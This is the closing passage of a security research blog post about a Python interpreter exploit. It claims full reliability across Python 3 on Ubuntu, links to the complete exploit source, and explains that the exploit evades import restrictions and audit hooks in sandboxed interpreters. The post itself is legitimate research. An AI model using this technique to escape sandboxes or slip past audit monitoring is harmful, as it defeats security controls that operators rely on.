        <span class="k">break</span>
</code></pre></div></div>
<p>If you want to follow along with the specifics of the parsing then I suggest reading the ELF <a href="https://man7.org/linux/man-pages/man5/elf.5.html">man page</a> and <a href="https://en.wikipedia.org/wiki/Executable_and_Linkable_Format">Wikipedia</a> article, which have more information on the structures involved.</p>

<h3 id="finished-product">Finished Product</h3>
<p>Putting all of these pieces together gives us a 100% reliable exploit which works in every version of Python 3 on x86-64 Ubuntu, even with PIE, full RELRO, and CET enabled, and it requires no imports. Trying it out on Ubuntu 22.04 gives:</p>

<p style="text-align: center;"><img src="/assets/python-buffered-reader/final.png" alt="Exploit on Ubuntu 22.04" width="500" /></p>

<p>You can find the full source of the exploit on my GitHub - <a href="https://github.com/kn32/python-buffered-reader-exploit/blob/master/exploit.py">https://github.com/kn32/python-buffered-reader-exploit/blob/master/exploit.py</a>.</p>

<h2 id="so-what">So what?</h2>
<p>What’s the point of this whole thing, can’t you just do <code class="language-plaintext highlighter-rouge">os.system(...)</code>? Well, yes.</p>

<p>Given that you need to be able to execute arbitary Python code in the first place, this exploit won’t be useful in most settings. However, it may be useful in Python interpreters which are attempting to sandbox your code, through restricting imports or use of <a href="https://peps.python.org/pep-0578/">Audit Hooks</a>, for example. This exploit doesn’t use any imports and doesn’t create any code objects, which will fire <code class="language-plaintext highlighter-rouge">import</code> and <code class="language-plaintext highlighter-rouge">code.__new__</code> hooks, respectively. My exploit will only trigger a <code class="language-plaintext highlighter-rouge">builtin.__id__</code> hook event, which is much more likely to be permitted.</p>

  </div><a class="u-url" href="/2022/05/11/python-buffered-reader.html" hidden></a>
</article>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <h2 class="footer-heading">pwn.win</h2>

    <div class="footer-col-wrapper">
      <div class="footer-col footer-col-1">
        <ul class="contact-list">
          <li class="p-name">pwn.win</li></ul>
      </div>

      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/kn32"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">kn32</span></a></li></ul>
</div>

      <div class="footer-col footer-col-3">
        <p>A diary of security exploration.</p>
      </div>
    </div>

  </div>

</footer>
</body>

</html>

